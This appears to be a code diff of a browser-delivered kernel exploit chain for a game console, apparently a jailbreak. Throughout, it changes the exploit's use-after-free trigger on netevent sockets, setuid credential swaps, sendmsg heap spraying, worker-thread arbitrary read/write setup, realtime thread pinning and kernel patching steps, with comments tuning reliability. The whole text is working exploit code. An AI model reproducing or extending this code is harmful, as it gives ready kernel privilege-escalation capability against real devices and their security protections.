-            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
-                w.ctx.S.low, w.ctx.S.hi);
-        }
 
         new Uint8Array(maskAb).fill(0);
         sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
@@ -787,6 +626,15 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             attrsRestored = true;
             const ID = new int64(0xffffffff, 0xffffffff);
 
+            // MAIN THREAD FIRST. attrsRestored is latched at the top of this
+            // function, so a death anywhere below leaves main realtime-256 on
+            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
+            // console then refuses to power off. The 16 worker RPCs used to run
+            // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
+            // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
+            // thread and never touches a worker; we cannot copy that (our
+            // workers outlive the page) but we can copy the ordering.
+            // Widen affinity before dropping priority, never the reverse.
             new Uint8Array(maskAb).fill(0);
             maskDv.setUint32(0, savedMask.low, true);
             maskDv.setUint32(4, savedMask.hi, true);
@@ -814,6 +662,9 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                 + " {" + savedPrio + "}");
             check("thread-attrs-restored-power-off-safe", good, "");
 
+            // Workers last, reported separately. By here main is already
+            // restored AND verified, so if these 16 RPCs never come back the
+            // console can still be shut down normally.
             let wr = 0, wn = 0;
             for (const w of workers) {
                 try {
@@ -830,24 +681,15 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             }
             mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
         }
+
         restoreCtx = { restore: restoreThreadAttrs };
-        dropGroomFootprint();
-        post("THREAD-ATTRS-SAVED", "mask=" + savedMask
+        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
             + " rtprio={" + savedPrio + "}");
-
-        async function jscBreath(n, why) {
-            for (let bi = 0; bi < n; ++bi) {
-                await new Promise(r => setTimeout(r, 0));
-                sc(SYS.sched_yield);
-            }
-            post("JSC-BREATH", "done n=" + n + " at=" + why);
-        }
-        for (let y = 0; y < 8; ++y) sc(SYS.sched_yield);
-
         prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
         prioDv.setUint16(2, RTP, true);
         new Uint8Array(maskAb).fill(0);
         maskDv.setUint32(0, 1 << MAIN_CORE, true);
+
         {
             const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
@@ -856,82 +698,18 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                 "core=" + MAIN_CORE + " rtp=" + RTP
                 + " affinity=" + a + " rtprio=" + r);
         }
-        dropGroomFootprint();
-        state("opening reclaim sockets...", "warn");
-        await openIpv6ReclaimSockets();
-        logQuiet = false;
-        paintLog();
-
-        async function pinWorkerRealtime(w) {
-            sc(SYS.sched_yield);
+        function fireW(w, num, args, timeoutMs) {
+            layout(w.ctx, stubAddr.get(num), args);
+            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
+                w.ctx.S.low, w.ctx.S.hi);
+        }
+        for (const w of workers) {
             await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
-            sc(SYS.sched_yield);
             await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
         }
-
-        let iovWorkers = [];
-        let uioWorkers = [];
-        let workersReady = false;
-
-        async function ensureWorkerPool() {
-            if (workersReady && workers.length === TOTAL_WORKERS) return;
-            if (ipv6.length > 0) closeIpv6FdBatch("pre-worker-spawn");
-            dropGroomFootprint();
-            lines.length = 0;
-            state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
-            for (let i = workers.length; i < TOTAL_WORKERS; ++i) {
-                post("WORKER-BRINGUP", (i + 1) + "/" + TOTAL_WORKERS);
-                const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
-                    + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
-                const w = { name: name, armed: false, wired: false };
-                workers.push(w);
-                w.worker = new Worker("rpc_worker.js?v=3");
-                w.rpc = makeRpc(w.worker, name);
-                if ((await w.rpc("ping", 15000)) !== "pong")
-                    throw new Error(name + " did not answer ping");
-                const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
-                const arr = await w.rpc("init", 15000, sLo, sHi);
-                const D = bufAddr(arr.buffer);
-                if ((p.read4(D) >>> 0) !== sLo)
-                    throw new Error(name + ": transfer did not preserve the store");
-                const storage = p.read8(D.add32(0x10));
-                const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
-                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
-                const bf = p.read8(mc.add32(8));
-                let wm = null, wv = null, wl = null;
-                for (let k = 1; k <= 8; ++k) {
-                    const val = p.read8(bf.sub32(8 * k));
-                    if (!ptrish(val)) continue;
-                    const inl = p.read8(val.add32(0x10));
-                    const len = p.read4(val.add32(0x18)) >>> 0;
-                    if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
-                    else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
-                    else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
-                }
-                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
-                w.master = wm; w.origVector = p.read8(wm.add32(0x10));
-                p.write8(wm.add32(0x10), wv); w.wired = true;
-                await w.rpc("setup", 15000, wl.low, wl.hi);
-                await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
-                w.armed = true;
-                await pinWorkerRealtime(w);
-                dropGroomFootprint();
-                sc(SYS.sched_yield);
-            }
-            check("worker-came-arw",
-                workers.length === TOTAL_WORKERS,
-                workers.length + "/" + TOTAL_WORKERS);
-            iovWorkers = workers.slice(0, NUM_IOV_WORKER);
-            uioWorkers = workers.slice(NUM_IOV_WORKER);
-            mark("WORKERS-LAZY", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length
-                + " core=" + MAIN_CORE + " rtp=" + RTP);
-            if (ipv6.length !== NUM_IPV6_SOCK) {
-                state("reopening reclaim sockets...", "warn");
-                await openIpv6ReclaimSockets();
-            }
-            workersReady = true;
-        }
+        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
+            + " rtp=" + RTP);
 
         function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
         function readTag() {
@@ -1040,8 +818,6 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
 
         let twins = null, triplets = null;
 
-        ensureKarwSetup();
-
         // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
         // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
         // whether an alias exists that we could NOT contain. poops.js:4356
@@ -1056,31 +832,30 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             state("attempt " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
-            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+            // SET_QUEUE retry — after a failed UAF attempt the kernel socket
+            // subsystem can be in a degraded state; yield + fresh socket usually
+            // clears it. Up to 8 tries per attempt before giving up.
+            let dummy = -1, reg = { rv: -1, err: 0 };
+            for (let sq = 0; sq < 8; sq++) {
+                if (dummy !== -1) sc(SYS.close, dummy);
+                if (sq > 0) {
+                    sc(SYS.sched_yield);
+                    sc(SYS.sched_yield);
+                    await new Promise(r => setTimeout(r, 20 * sq));
+                }
+                dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+                if (dummy === -1) { reg = { rv: -1, err: -1 }; continue; }
+                reg = netevent(dummy, NETEVENT_SET_QUEUE);
+                if (reg.rv !== -1) break;
+            }
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
-            let reg = neteventSlot(-1, dummy, NETEVENT_SET_QUEUE);
-            let slotUsed = -1;
             if (reg.rv === -1) {
-                reg = neteventSlot(1, dummy, NETEVENT_SET_QUEUE);
-                slotUsed = 1;
+                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
+                sc(SYS.close, dummy); continue;
             }
-            if (reg.rv === -1) {
-                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err
-                    + " slots full (both -1 and 1 occupied)"
-                    + (reg.err === 5
-                        ? " — EIO: netevent slots stuck in this WebProcess; full browser close or reboot"
-                        : ""));
-                sc(SYS.close, dummy);
-                continue;
-            }
-            mark("SLOT", "queued=" + dummy + " on slot="
-                + (slotUsed === -1 ? "-1" : "1") + " rv=" + reg.rv);
 
             sc(SYS.close, dummy);
-            if (!credSwapTwice()) {
-                mark("ATTEMPT-SKIP", "cred swap failed errno=" + errno());
-                continue;
-            }
+            sc(SYS.setuid, 1);
             uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             if (uafSock !== dummy) {
                 mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
@@ -1089,40 +864,15 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
                 uafSock = 0;
                 continue;
             }
-            if (!credSwapTwice()) {
-                mark("ATTEMPT-SKIP", "cred swap #2 failed errno=" + errno());
-                continue;
-            }
-            const clr = neteventSlot(slotUsed, uafSock, NETEVENT_CLEAR_QUEUE);
-            if (clr.rv === -1 && clr.err === 5) {
-                mark("CLEAR-ERR5-COSMETIC", "slot="
-                    + (slotUsed === -1 ? "-1" : "1") + " fd=" + uafSock + " proceeding");
-            }
-            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv
-                + " slot=" + (slotUsed === -1 ? "-1" : "1"));
+            sc(SYS.setuid, 1);
+            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
+            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
             committed = true;
 
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
             catch (e) { }
 
-            const sprayFd = spraySockpair() || 0;
-            mark("SPRAY-FD", sprayFd > 0 ? "using spray fd=" + sprayFd : "fallback fd=0");
-            const sprayErrs = {};
-            let sprayFail = 0, sprayFirst = -1;
-            for (let i = 0; i < 0x80; ++i) {
-                const rv = sc(SYS.sendmsg, sprayFd, msgAddr, 0).i32;
-                if (i === 0) sprayFirst = rv;
-                if (rv !== 0) {
-                    sprayFail++;
-                    const e = errno();
-                    sprayErrs[e] = (sprayErrs[e] | 0) + 1;
-                }
-            }
-            mark("SPRAY-STATS", "fd=" + sprayFd + " first=" + sprayFirst
-                + " fail=" + sprayFail + "/0x80"
-                + (sprayFail ? " errnos=" + JSON.stringify(sprayErrs) : " errnos=none"));
-            if (sprayFail === 0x80 && sprayErrs["14"])
-                mark("SPRAY-HINT", "all EFAULT: no ucred on reclaim heap (setuid(1) no-op @ uid=1 — run ?probe=credswap)");
+            for (let i = 0; i < 0x80; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
 
             if (STOP_BEFORE_DOUBLE) {
                 mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
@@ -1150,7 +900,6 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
             mark("TWINS", "a=" + twins.a + " b=" + twins.b
                 + " round=" + twins.round);
 
-            await ensureWorkerPool();
             freeRthdr(twins.b);
             let reclaimed = false, rounds = 0;
 
@@ -2420,7 +2169,6 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-retail-groom";
 
 
                     let kpatched = false;
-                    await ensureKernelBlobs();
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
